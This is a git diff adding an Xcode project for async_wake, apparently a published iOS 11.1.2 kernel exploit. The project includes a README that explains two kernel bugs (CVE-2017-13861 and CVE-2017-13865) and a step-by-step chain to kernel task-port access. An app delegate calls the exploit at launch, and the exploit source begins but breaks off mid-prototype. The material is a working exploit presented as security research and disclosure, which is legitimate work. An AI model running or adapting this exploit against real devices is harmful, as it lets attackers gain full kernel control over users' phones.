zEY56+^QPM%Q#bg{2EW+=_YH900Jjaavw?Ot=zoL$H@Mpd9^Al#8+>bnxwFCC*#M6X
za(07v(FRy-potB*-XKRdIB$bl_PM<M+<g2Twx8R5J~tab$I<7${kfU{d7q+%&uL*J
zA8*wEMj5aXFB|c)5ic9ftBu}N8{x50u5L72H`2q#j}#m?%At*T+ekATd1fOWZsfO(
z{I-$bHrid|&E<H%iT9g$xW~gi9&Yip6Hhzw`j6Ltyt~Dl4e@3}yl=&u*YW0cJUrs<
z9r5xc9v1O55s&M5Sr_lT_+v^=$IIz>*v8B1O)_i~jyC!BCbM#rJl#YKn`mK^jNhdH
zO)_8;UN+%n6J9pi88_MAHo;@F9Ng?3wwWF_o1dHExY;b+jJM4+vzcc$)8S@*+stp9
z`E9fONs!YCev{xg32;w<dji}NXeWVo67-*-{{(kSFqabS0SUg9;60FFt|q`E!Csvp
zPZD5}KobeLPLP`k&P$M+3Gy+)tV@7xf(%YDr?%i|i*Ij{`&-PoEwr$O7PffHZqff1
z8L$N}Tkx_4FI(i`7Q4b0cx;h_TjbytSZtw*L|iAz!9==G#9bo)Cd%_fx=y6)L|RPb
zmqc?p(OgdC>qK5mH187el8Bc?yd?5sA}=P|%M<NaiSS8uuS6M|=+239H}U;>cFwIb
zWh)%E^3qmVY=yyAyl=(%R{6J;*0-7!Tjl;%xxZC5Z8hh%;(n_=ZY%t^`u<ikZmaKa
zmH%7yy;a{^&8w}r-X`z1>1`YAw>fJYeQlG?+h}T=p0@GVHvZbCw{7O?Hdt@_W5r|J
z;JOX&N!}Al_RpjViYAiyBgu}O1p6d<PBIIU@RmfwNi>|q&q?}7;<+S#PQqgnypr^h
zq>m(hB<UkbA4&2m33o}bO43UbtdjJSgsUVzO{U3Y@62TSNv4xznVZZr$#$`1cqP+J
zva^%Ton*O@thZ#ldNSQ4%iUzWB;zF+FUfdGmXXQyn@qpSbdoGHl3|r>1}B>p$@G#;
zFUj_UWL%}tL<+s8*!5C;KLu7PFiN3=6go(eK`Atlf~OScq&O$VIVsLbaZZZfQe;z#
z*`7j!DfFAdlPUa|!jCC9O0jpP@L~!trto5_eJfQirOKsLn5Xhps$5FttyGzk8m(w2
zm6uZ8Efue+=29w5QgM+gpHk&hs(ebtN2>iK6)vf8Nwu4#%92z$or;%KIHl5AD!x<o
zlZvNQJf-R*)!kF^l8Tp9yrlA0s$Npf(^T1#3Zqn>Oy$Q^dt_>>(nFdIPLsQ7=3<)j
z(`YVDrls*z8a<@JG0pjD_Nz4dOS3Db*&Wm9F3rqLbB8qCrI~YSbdm<wG+In^r!;$A
zn!PTK=F{jT4TotopXNSkcuTX>rolPQyDm+prJMEX@+n<5rqgh`j8BJWIvuCOGTrP-
zx5K2%oOB$g+hx+}H{Co=hgmwGr1MF-d#2+)-CRz0&vd+}yJNaLrhEIO+vC#hB<b#&
z?w;xVna-c-?wHP(>2OP@wR9Rwr?GVRO^07P{L*P4U6!ZIqIB7iE*sKmKi&N^%%}`K
zWbj~yduPbjj6h{hXL!G4$k_~7XPEIByqE#!3_NGpwKD7t8F0;T-we2Bz%|32GiWsf
z#~HksL8BRX&cJg9Tr=!X8Mw~Cb%r}<$dU|uREGCl27WW#Ydb8r+ZVTc4{SHnw!>^Y
zU2T_H+i7V#Ep0cSx68-v@YxQZ?ReU*@9j9+uJ7%9u$>RK)6I4{yj{=Rd0@L)w%sht
zlv|nfpNYFn=Vj7VCeAYTpQ-;$nUHBNXWB<H?Pr<%kZC{5G^;XsA~R0O)l3@9<cUn4
z$mEGk8I_6WOuJepU1s7sQ_g3)d!~IeQx0az!Au^{<nc_N$i#J~9LdCOCT=tNJCnaN
zVV5aKGVz?rBbhwC!##J{5q3Ct2cPY*qwRp_4*9Y}|2y=*gFbiYeTUw6z;uT_ZHIZZ
zgLkrMG>hl6^qM7Sv&^_G`JE;EvgBQs9<um4%l)(Ljam54!grQAl|`#r&dkDn7H?<i
zBMbjo@+k`kSvb#fpDa6gmiuP$P?q;i7Ot~!oJE^i?wCcJSvbkULpJSY(_Xe5&i1~}
zwkKt~SGId);~-l;W}BJWW@fgxVK&UO<#V=7&W3e1|7XKF+dZ?rd9&>_+3uU|zS-`Z
z?Y`M`k`2pjxMb6Rj{M7!e>u+0`K@wpj=dy@=5p*5Id+O1`)H1tmLm&u)+l`E*e!GH
zmO1vH9J^HxPv<y02gf=5oFjj7csd8)Ic98*^K+b^!_zrDl7r_Q{>Y)(9C+pMbPnEg
zWKfP-l~by`TXNu)!_zr5og;g4;FUwuIlP=B3v=+AgV&r+#nU-<tsL6Uq3v8f<?1CD
z&$+TFm#1@KnTz9Gp3c={E??*JRxWMl%J^I!%e8;y%K2RV<;tvFb1)aqxpbDR&s-Uw
ztG8Ue<-#^sZ@KiF%lEl_p9|w$edXdl*ZV71AGx%fOS`$Wkjv}2G@5JP=bBZyax@no
zx!w=C?TS8g?Jv1Bnkxfx-wqkJ6Hhz!veWLjlV*3CQ9Ipzr=52v5A4LzPH(84?z<Bo
zJKcAu`|jk&oix0YhIi8NPTJUM2JDm@J8`gc-;n?N?}Oj@fB)|e81n!B8@6-*{{f~m
BM~MIc

literal 0
Hc$@<O00001

diff --git a/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist b/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist
new file mode 100644
index 0000000..9f164fd
--- /dev/null
+++ b/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcdebugger/Breakpoints_v2.xcbkptlist
@@ -0,0 +1,23 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<Bucket
+   type = "1"
+   version = "2.0">
+   <Breakpoints>
+      <BreakpointProxy
+         BreakpointExtensionID = "Xcode.Breakpoint.FileBreakpoint">
+         <BreakpointContent
+            shouldBeEnabled = "No"
+            ignoreCount = "0"
+            continueAfterRunningActions = "No"
+            filePath = "async_wake_ios/async_wake.c"
+            timestampString = "534701267.2188"
+            startingColumnNumber = "9223372036854775807"
+            endingColumnNumber = "9223372036854775807"
+            startingLineNumber = "343"
+            endingLineNumber = "343"
+            landmarkName = "build_message_payload"
+            landmarkType = "9">
+         </BreakpointContent>
+      </BreakpointProxy>
+   </Breakpoints>
+</Bucket>
diff --git a/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcschemes/xcschememanagement.plist b/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcschemes/xcschememanagement.plist
new file mode 100644
index 0000000..64e4970
--- /dev/null
+++ b/async_wake_ios.xcodeproj/xcuserdata/ianbeer.xcuserdatad/xcschemes/xcschememanagement.plist
@@ -0,0 +1,14 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>SchemeUserState</key>
+	<dict>
+		<key>async_wake_ios.xcscheme</key>
+		<dict>
+			<key>orderHint</key>
+			<integer>0</integer>
+		</dict>
+	</dict>
+</dict>
+</plist>
diff --git a/async_wake_ios/AppDelegate.h b/async_wake_ios/AppDelegate.h
new file mode 100644
index 0000000..3621106
--- /dev/null
+++ b/async_wake_ios/AppDelegate.h
@@ -0,0 +1,9 @@
+#import <UIKit/UIKit.h>
+
+@interface AppDelegate : UIResponder <UIApplicationDelegate>
+
+@property (strong, nonatomic) UIWindow *window;
+
+
+@end
+
diff --git a/async_wake_ios/AppDelegate.m b/async_wake_ios/AppDelegate.m
new file mode 100644
index 0000000..0a3fea0
--- /dev/null
+++ b/async_wake_ios/AppDelegate.m
@@ -0,0 +1,45 @@
+#import "AppDelegate.h"
+#include "async_wake.h"
+
+@interface AppDelegate ()
+
+@end
+
+@implementation AppDelegate
+
+
+- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
+  // Override point for customization after application launch.
+  go();
+  return YES;
+}
+
+
+- (void)applicationWillResignActive:(UIApplication *)application {
+  // Sent when the application is about to move from active to inactive state. This can occur for certain types of temporary interruptions (such as an incoming phone call or SMS message) or when the user quits the application and it begins the transition to the background state.
+  // Use this method to pause ongoing tasks, disable timers, and invalidate graphics rendering callbacks. Games should use this method to pause the game.
+}
+
+
+- (void)applicationDidEnterBackground:(UIApplication *)application {
+  // Use this method to release shared resources, save user data, invalidate timers, and store enough application state information to restore your application to its current state in case it is terminated later.
+  // If your application supports background execution, this method is called instead of applicationWillTerminate: when the user quits.
+}
+
+
+- (void)applicationWillEnterForeground:(UIApplication *)application {
+  // Called as part of the transition from the background to the active state; here you can undo many of the changes made on entering the background.
+}
+
+
+- (void)applicationDidBecomeActive:(UIApplication *)application {
+  // Restart any tasks that were paused (or not yet started) while the application was inactive. If the application was previously in the background, optionally refresh the user interface.
+}
+
+
+- (void)applicationWillTerminate:(UIApplication *)application {
+  // Called when the application is about to terminate. Save data if appropriate. See also applicationDidEnterBackground:.
+}
+
+
+@end
diff --git a/async_wake_ios/Assets.xcassets/AppIcon.appiconset/Contents.json b/async_wake_ios/Assets.xcassets/AppIcon.appiconset/Contents.json
new file mode 100644
index 0000000..1d060ed
--- /dev/null
+++ b/async_wake_ios/Assets.xcassets/AppIcon.appiconset/Contents.json
@@ -0,0 +1,93 @@
+{
+  "images" : [
+    {
+      "idiom" : "iphone",
+      "size" : "20x20",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "20x20",
+      "scale" : "3x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "29x29",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "29x29",
+      "scale" : "3x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "40x40",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "40x40",
+      "scale" : "3x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "60x60",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "iphone",
+      "size" : "60x60",
+      "scale" : "3x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "20x20",
+      "scale" : "1x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "20x20",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "29x29",
+      "scale" : "1x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "29x29",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "40x40",
+      "scale" : "1x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "40x40",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "76x76",
+      "scale" : "1x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "76x76",
+      "scale" : "2x"
+    },
+    {
+      "idiom" : "ipad",
+      "size" : "83.5x83.5",
+      "scale" : "2x"
+    }
+  ],
+  "info" : {
+    "version" : 1,
+    "author" : "xcode"
+  }
+}
\ No newline at end of file
diff --git a/async_wake_ios/Base.lproj/LaunchScreen.storyboard b/async_wake_ios/Base.lproj/LaunchScreen.storyboard
new file mode 100644
index 0000000..f83f6fd
--- /dev/null
+++ b/async_wake_ios/Base.lproj/LaunchScreen.storyboard
@@ -0,0 +1,25 @@
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="13122.16" systemVersion="17A277" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" launchScreen="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="01J-lp-oVM">
+    <dependencies>
+        <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="13104.12"/>
+        <capability name="Safe area layout guides" minToolsVersion="9.0"/>
+        <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
+    </dependencies>
+    <scenes>
+        <!--View Controller-->
+        <scene sceneID="EHf-IW-A2E">
+            <objects>
+                <viewController id="01J-lp-oVM" sceneMemberID="viewController">
+                    <view key="view" contentMode="scaleToFill" id="Ze5-6b-2t3">
+                        <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
+                        <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
+                        <color key="backgroundColor" red="1" green="1" blue="1" alpha="1" colorSpace="custom" customColorSpace="sRGB"/>
+                        <viewLayoutGuide key="safeArea" id="6Tk-OE-BBY"/>
+                    </view>
+                </viewController>
+                <placeholder placeholderIdentifier="IBFirstResponder" id="iYj-Kq-Ea1" userLabel="First Responder" sceneMemberID="firstResponder"/>
+            </objects>
+            <point key="canvasLocation" x="53" y="375"/>
+        </scene>
+    </scenes>
+</document>
diff --git a/async_wake_ios/Base.lproj/Main.storyboard b/async_wake_ios/Base.lproj/Main.storyboard
new file mode 100644
index 0000000..d7c78a1
--- /dev/null
+++ b/async_wake_ios/Base.lproj/Main.storyboard
@@ -0,0 +1,24 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<document type="com.apple.InterfaceBuilder3.CocoaTouch.Storyboard.XIB" version="3.0" toolsVersion="13122.16" systemVersion="17A277" targetRuntime="iOS.CocoaTouch" propertyAccessControl="none" useAutolayout="YES" useTraitCollections="YES" useSafeAreas="YES" colorMatched="YES" initialViewController="BYZ-38-t0r">
+    <dependencies>
+        <plugIn identifier="com.apple.InterfaceBuilder.IBCocoaTouchPlugin" version="13104.12"/>
+        <capability name="Safe area layout guides" minToolsVersion="9.0"/>
+        <capability name="documents saved in the Xcode 8 format" minToolsVersion="8.0"/>
+    </dependencies>
+    <scenes>
+        <!--View Controller-->
+        <scene sceneID="tne-QT-ifu">
+            <objects>
+                <viewController id="BYZ-38-t0r" customClass="ViewController" customModuleProvider="" sceneMemberID="viewController">
+                    <view key="view" contentMode="scaleToFill" id="8bC-Xf-vdC">
+                        <rect key="frame" x="0.0" y="0.0" width="375" height="667"/>
+                        <autoresizingMask key="autoresizingMask" widthSizable="YES" heightSizable="YES"/>
+                        <color key="backgroundColor" red="1" green="1" blue="1" alpha="1" colorSpace="custom" customColorSpace="sRGB"/>
+                        <viewLayoutGuide key="safeArea" id="6Tk-OE-BBY"/>
+                    </view>
+                </viewController>
+                <placeholder placeholderIdentifier="IBFirstResponder" id="dkx-z0-nzr" sceneMemberID="firstResponder"/>
+            </objects>
+        </scene>
+    </scenes>
+</document>
diff --git a/async_wake_ios/Info.plist b/async_wake_ios/Info.plist
new file mode 100644
index 0000000..16be3b6
--- /dev/null
+++ b/async_wake_ios/Info.plist
@@ -0,0 +1,45 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+	<key>CFBundleDevelopmentRegion</key>
+	<string>$(DEVELOPMENT_LANGUAGE)</string>
+	<key>CFBundleExecutable</key>
+	<string>$(EXECUTABLE_NAME)</string>
+	<key>CFBundleIdentifier</key>
+	<string>$(PRODUCT_BUNDLE_IDENTIFIER)</string>
+	<key>CFBundleInfoDictionaryVersion</key>
+	<string>6.0</string>
+	<key>CFBundleName</key>
+	<string>$(PRODUCT_NAME)</string>
+	<key>CFBundlePackageType</key>
+	<string>APPL</string>
+	<key>CFBundleShortVersionString</key>
+	<string>1.0</string>
+	<key>CFBundleVersion</key>
+	<string>1</string>
+	<key>LSRequiresIPhoneOS</key>
+	<true/>
+	<key>UILaunchStoryboardName</key>
+	<string>LaunchScreen</string>
+	<key>UIMainStoryboardFile</key>
+	<string>Main</string>
+	<key>UIRequiredDeviceCapabilities</key>
+	<array>
+		<string>armv7</string>
+	</array>
+	<key>UISupportedInterfaceOrientations</key>
+	<array>
+		<string>UIInterfaceOrientationPortrait</string>
+		<string>UIInterfaceOrientationLandscapeLeft</string>
+		<string>UIInterfaceOrientationLandscapeRight</string>
+	</array>
+	<key>UISupportedInterfaceOrientations~ipad</key>
+	<array>
+		<string>UIInterfaceOrientationPortrait</string>
+		<string>UIInterfaceOrientationPortraitUpsideDown</string>
+		<string>UIInterfaceOrientationLandscapeLeft</string>
+		<string>UIInterfaceOrientationLandscapeRight</string>
+	</array>
+</dict>
+</plist>
diff --git a/async_wake_ios/README b/async_wake_ios/README
new file mode 100644
index 0000000..d88ddbd
--- /dev/null
+++ b/async_wake_ios/README
@@ -0,0 +1,168 @@
+async_wake - iOS 11.1.2 kernel exploit and PoC local kernel debugger by @i41nbeer
+
+Supported Devices:
+ tfp0: all 64-bit devices running 11.1.2
+
+ tfp0 + local kernel debugger: the devices I have on my desk running 11.1.2 (iPhone 7, iPhone 6s, iPod Touch 6G)
+                               theoretically it will also work for all other devices, you just need to find the symbols
+
+PoC local kernel debugger:
+You can pause the execution of a syscall at arbitrary points and modify kernel state (registers and memory) then continue it.
+See kdbg.c for details and implementation.
+
+The bugs:
+
+=== CVE-2017-13861 ===
+[https://bugs.chromium.org/p/project-zero/issues/detail?id=1417]
+
+I have previously detailed the lifetime management paradigms in MIG in the writeups for:
+CVE-2016-7612 [https://bugs.chromium.org/p/project-zero/issues/detail?id=926]
+and
+CVE-2016-7633 [https://bugs.chromium.org/p/project-zero/issues/detail?id=954]
+
+If a MIG method returns KERN_SUCCESS it means that the method took ownership of *all* the arguments passed to it.
+If a MIG method returns an error code, then it took ownership of *none* of the arguments passed to it.
+
+If an IOKit userclient external method takes an async wake mach port argument then the lifetime of the reference
+on that mach port passed to the external method will be managed by MIG semantics. If the external method returns
+an error then MIG will assume that the reference was not consumed by the external method and as such the MIG
+generated coode will drop a reference on the port.
+
+IOSurfaceRootUserClient external method 17 (s_set_surface_notify) will drop a reference on the wake_port
+(via IOUserClient::releaseAsyncReference64) then return an error code if the client has previously registered
+a port with the same callback function.
+
+The external method's error return value propagates via the return value of is_io_connect_async_method back to the
+MIG generated code which will drop a futher reference on the wake_port when only one was taken.
+
+I also use another bug:
+
+=== CVE-2017-13865 ===
+[https://bugs.chromium.org/p/project-zero/issues/detail?id=1372]
+the kernel libproc API proc_list_uptrs has the following comment in it's userspace header:
+
+/*
+ * Enumerate potential userspace pointers embedded in kernel data structures.
+ * Currently inspects kqueues only.
+ *
+ * NOTE: returned "pointers" are opaque user-supplied values and thus not
+ * guaranteed to address valid objects or be pointers at all.
+ *
+ * Returns the number of pointers found (which may exceed buffersize), or -1 on
+ * failure and errno set appropriately.
+ */
+
+This is a recent addition to the kernel, presumably as a debugging tool to help enumerate
+places where the kernel is accidentally disclosing pointers to userspace.
+
+The implementation currently enumerates kqueues and dumps a bunch of values from them.
+
+Here's the relevant code:
+
+// buffer and buffersize are attacker controlled
+
+int
+proc_pidlistuptrs(proc_t p, user_addr_t buffer, uint32_t buffersize, int32_t *retval)
+{
+  uint32_t count = 0;
+  int error = 0;
+  void *kbuf = NULL;
+  int32_t nuptrs = 0;
+
+  if (buffer != USER_ADDR_NULL) {
+    count = buffersize / sizeof(uint64_t);     <---(a)
+    if (count > MAX_UPTRS) {
+      count = MAX_UPTRS;
+      buffersize = count * sizeof(uint64_t);
+    }
+    if (count > 0) {
+      kbuf = kalloc(buffersize);               <--- (b)
+      assert(kbuf != NULL);
+    }
+  } else {
+    buffersize = 0;
+  }
+
+  nuptrs = kevent_proc_copy_uptrs(p, kbuf, buffersize);
+
+  if (kbuf) {
+    size_t copysize;
+    if (os_mul_overflow(nuptrs, sizeof(uint64_t), &copysize)) {  <--- (c)
+      error = ERANGE;
+      goto out;
+    }
+    if (copysize > buffersize) {    <-- (d)
+      copysize = buffersize;
+    }
+    error = copyout(kbuf, buffer, copysize);  <--- (e)
+  }
+
+
+At (a) the attacker-supplied buffersize is divided by 8 to compute the maximum number of uint64_t's
+which can fit in there.
+
+If that value isn't huge then the attacker-supplied buffersize is used to kalloc the kbuf buffer at (b).
+
+kbuf and buffersize are then passed to kevent_proc_copy_uptrs. Looking at the implementation of
+kevent_proc_copy_uptrs the return value is the total number of values it found, even if that value is larger
+than the supplied buffer. If it finds more than will fit it keeps counting but no longer writes them to the kbuf.
+
+This means that at (c) the computed copysize value doesn't reflect how many values were actually written to kbuf
+but how many *could* have been written had the buffer been big enough.
+
+If there were possible values which could have been written than there was space in the buffer then at (d) copysize
+will be limited down to buffersize.
+
+Copysize is then used at (e) to copy the contents of kbuf to userspace.
+
+The bug is that there's no enforcement that (buffersize % 8) == 0. If we were to pass a buffersize of 15, at (a) count would be 1
+as 15 bytes is only enough to store 1 complete uint64_t. At (b) this would kalloc a buffer of 15 bytes.
+
+If the target pid actually had 10 possible values which kevent_proc_copy_uptrs finds then nuptrs will return 10 but it will
+only write to the first value to kbuf, leaving the last 7 bytes untouched.
+
+At (c) copysize will be computed at 10*8 = 80 bytes, at (d) since 80 > 15 copysize will be truncated back down to buffersize (15)
+and at (e) 15 bytes will be copied back to userspace even though only 8 were written to.
+
+
+Exploit technique:
+I use the proc_pidlistuptrs bug to disclose the address of arbitrary ipc_ports. This makes stuff a lot simpler :)
+To find a port address I fill a bunch of different-sized kalloc allocations with a pointer to the target port via mach messages using OOL_PORTS.
+
+I then trigger the OOB read bug for various kalloc sizes and look for the most commonly leaked kernel pointer. Given the
+semantics of kalloc this works well.
+
+I make a pretty large number of kalloc allocations (via sending mach messages) in a kalloc size bin I won't use later, and I keep hold of them for now.
+
+I allocate a bunch of mach ports to ensure that I have a page containing only my ports. I use the port address disclosure to find
+a port which fits within particular bounds on a page. Once I've found it, I use the IOSurface bug to give myself a dangling pointer to that port.
+
+I free the kalloc allocations made earlier and all the other ports then start making kalloc.4096 allocations (again via crafted mach messages.)
+
+I do the reallocation slowly, 1MB at a time so that a kernel zone garbage collection will trigger and collect the page that the dangling pointer points to.
+
+The GC will trigger when the zone map is over 95% full. It's easy to do that, the trick is to make sure there's plenty of stuff which the GC can collect
+so that you don't get immediately killed by jetsam. All devices have the same sized zone map (384MB).
+
+The replacement kalloc.4096 allocations are ipc_kmsg buffers which contain a fake IKOT_TASK port pointing to a fake struct task.
+I use the bsdinfo->pid trick to build an arbitrary read with this (see details in async_wake.c.)
+
+With the arbitrary read I find the kernel task's vm_map and the kernel ipc_space. I then free and reallocate the kalloc.4096 buffer replacing it with a fake
+kernel task port.
+
+Limitations:
+The technique should work reliably enough for a security research tool. For me it works about 9/10 times. If you run it multiple times without rebooting,
+it will probably panic, the GC forcing and reallocating trick isn't particularly advanced.
+
+It's more likely to work after a fresh reboot.
+
+The tfp0 returned by get_kernel_memory_rw should be safe to keep using after the exploit process has exited, but I haven't tested that.
+
+Porting to other devices:
+
+Getting tfp0 should work for all devices running 11.1.2, it only requires structure offsets, not kernel symbols, which are unlikely to change between devices.
+To port the PoC kernel debugger you need to find the correct symbols and update symbols.c, hints are given there.
+
+For further discussion of this bug and other exploit techniques see:
+http://blog.pangu.io/iosurfacerootuserclient-port-uaf/
+https://siguza.github.io/v0rtex/
diff --git a/async_wake_ios/ViewController.h b/async_wake_ios/ViewController.h
new file mode 100644
index 0000000..a79652b
--- /dev/null
+++ b/async_wake_ios/ViewController.h
@@ -0,0 +1,7 @@
+#import <UIKit/UIKit.h>
+
+@interface ViewController : UIViewController
+
+
+@end
+
diff --git a/async_wake_ios/ViewController.m b/async_wake_ios/ViewController.m
new file mode 100644
index 0000000..d5f037c
--- /dev/null
+++ b/async_wake_ios/ViewController.m
@@ -0,0 +1,23 @@
+#import "ViewController.h"
+#include <stdio.h>
+
+@interface ViewController ()
+
+@end
+
+@implementation ViewController
+
+- (void)viewDidLoad {
+  [super viewDidLoad];
+  // Do any additional setup after loading the view, typically from a nib.
+}
+
+
+- (void)didReceiveMemoryWarning {
+  printf("******* received memory warning! ***********\n");
+  [super didReceiveMemoryWarning];
+  // Dispose of any resources that can be recreated.
+}
+
+
+@end
diff --git a/async_wake_ios/arm64_state.h b/async_wake_ios/arm64_state.h
new file mode 100644
index 0000000..368b294
--- /dev/null
+++ b/async_wake_ios/arm64_state.h
@@ -0,0 +1,131 @@
+#ifndef arm64_state_h
+#define arm64_state_h
+
+/*
+ * GPR context
+ */
+
+struct arm_saved_state32 {
+  uint32_t  r[13];    /* General purpose register r0-r12 */
+  uint32_t  sp;      /* Stack pointer r13 */
+  uint32_t  lr;      /* Link register r14 */
+  uint32_t  pc;      /* Program counter r15 */
+  uint32_t  cpsr;    /* Current program status register */
+  uint32_t  far;    /* Virtual fault address */
+  uint32_t  esr;    /* Exception syndrome register */
+  uint32_t  exception;  /* Exception number */
+};
+typedef struct arm_saved_state32 arm_saved_state32_t;
+
+struct arm_saved_state32_tagged {
+  uint32_t          tag;
+  struct arm_saved_state32  state;
+};
+typedef struct arm_saved_state32_tagged arm_saved_state32_tagged_t;
+
+#define ARM_SAVED_STATE32_COUNT ((mach_msg_type_number_t) \
+(sizeof (arm_saved_state32_t)/sizeof(unsigned int)))
+
+struct arm_saved_state64 {
+  uint64_t    x[29];    /* General purpose registers x0-x28 */
+  uint64_t    fp;      /* Frame pointer x29 */
+  uint64_t    lr;      /* Link register x30 */
+  uint64_t    sp;      /* Stack pointer x31 */
+  uint64_t    pc;      /* Program counter */
+  uint32_t    cpsr;    /* Current program status register */
+  uint32_t  reserved;  /* Reserved padding */
+  uint64_t  far;    /* Virtual fault address */
+  uint32_t  esr;    /* Exception syndrome register */
+  uint32_t  exception;  /* Exception number */
+};
+typedef struct arm_saved_state64 arm_saved_state64_t;
+
+#define ARM_SAVED_STATE64_COUNT ((mach_msg_type_number_t) \
+(sizeof (arm_saved_state64_t)/sizeof(unsigned int)))
+
+struct arm_saved_state {
+  arm_state_hdr_t ash;
+  union {
+    struct arm_saved_state32 ss_32;
+    struct arm_saved_state64 ss_64;
+  } uss;
+} __attribute__((aligned(16)));
+#define  ss_32  uss.ss_32
+#define  ss_64  uss.ss_64
+
+typedef struct arm_saved_state arm_saved_state_t;
+
+/*
+ * NEON context
+ */
+typedef __uint128_t uint128_t;
+typedef uint64_t uint64x2_t __attribute__((ext_vector_type(2)));
+typedef uint32_t uint32x4_t __attribute__((ext_vector_type(4)));
+
+struct arm_neon_saved_state32 {
+  union {
+    uint128_t  q[16];
+    uint64_t  d[32];
+    uint32_t  s[32];
+  } v;
+  uint32_t    fpsr;
+  uint32_t    fpcr;
+};
+typedef struct arm_neon_saved_state32 arm_neon_saved_state32_t;
+
+#define ARM_NEON_SAVED_STATE32_COUNT ((mach_msg_type_number_t) \
+(sizeof (arm_neon_saved_state32_t)/sizeof(unsigned int)))
+
+struct arm_neon_saved_state64 {
+  union {
+    uint128_t    q[32];
+    uint64x2_t    d[32];
+    uint32x4_t    s[32];
+  } v;
+  uint32_t    fpsr;
+  uint32_t    fpcr;
+};
+typedef struct arm_neon_saved_state64 arm_neon_saved_state64_t;
+
+#define ARM_NEON_SAVED_STATE64_COUNT ((mach_msg_type_number_t) \
+(sizeof (arm_neon_saved_state64_t)/sizeof(unsigned int)))
+
+struct arm_neon_saved_state {
+  arm_state_hdr_t nsh;
+  union {
+    struct arm_neon_saved_state32 ns_32;
+    struct arm_neon_saved_state64 ns_64;
+  } uns;
+};
+typedef struct arm_neon_saved_state arm_neon_saved_state_t;
+#define  ns_32  uns.ns_32
+#define  ns_64  uns.ns_64
+
+struct arm_context {
+  struct arm_saved_state ss;
+  struct arm_neon_saved_state ns;
+};
+typedef struct arm_context arm_context_t;
+
+#define ARM_SAVED_STATE64 0x15
+
+#define ARM_DEBUG_STATE64 15
+const uint64_t ACT_DEBUGDATA_OFFSET = 0x438;
+
+struct arm64_debug_state
+{
+  __uint64_t  bvr[16];
+  __uint64_t  bcr[16];
+  __uint64_t  wvr[16];
+  __uint64_t  wcr[16];
+  __uint64_t  mdscr_el1; /* Bit 0 is SS (Hardware Single Step) */
+};
+
+struct arm_debug_aggregate_state {
+  arm_state_hdr_t          dsh;
+  struct arm64_debug_state ds64;
+} __attribute__((aligned(16)));
+
+
+
+#endif
diff --git a/async_wake_ios/async_wake.c b/async_wake_ios/async_wake.c
new file mode 100644
index 0000000..e9f71d5
--- /dev/null
+++ b/async_wake_ios/async_wake.c
@@ -0,0 +1,701 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+#include <mach/mach.h>
+
+#include <pthread.h>
+
+#include <CoreFoundation/CoreFoundation.h>
+
+#include "async_wake.h"
+#include "kmem.h"
+#include "find_port.h"
+#include "kutils.h"
+#include "symbols.h"
+#include "early_kalloc.h"
+#include "kcall.h"
+#include "kdbg.h"
+
+// various prototypes and structure definitions for missing iOS headers:
+
+kern_return_t mach_vm_read(
+  vm_map_t target_task,
+  mach_vm_address_t address,
+  mach_vm_size_t size,
+  vm_offset_t *data,
+  mach_msg_type_number_t *dataCnt);
+
+/****** IOKit/IOKitLib.h *****/
+typedef mach_port_t io_service_t;
+typedef mach_port_t io_connect_t;
+
+extern const mach_port_t kIOMasterPortDefault;
+#define IO_OBJECT_NULL (0)
+
+kern_return_t
+IOConnectCallAsyncMethod(
+  mach_port_t     connection,
+  uint32_t        selector,
+  mach_port_t     wakePort,
+  uint64_t*       reference,
+  uint32_t        referenceCnt,
+  const uint64_t* input,
+  uint32_t        inputCnt,
+  const void*     inputStruct,
+  size_t          inputStructCnt,
+  uint64_t*       output,
+  uint32_t*       outputCnt,
+  void*           outputStruct,
+  size_t*         outputStructCntP);
+
+kern_return_t
+IOConnectCallMethod(
+  mach_port_t     connection,
+  uint32_t        selector,
+  const uint64_t* input,
+  uint32_t        inputCnt,
+  const void*     inputStruct,
+  size_t          inputStructCnt,
+  uint64_t*       output,
+  uint32_t*       outputCnt,
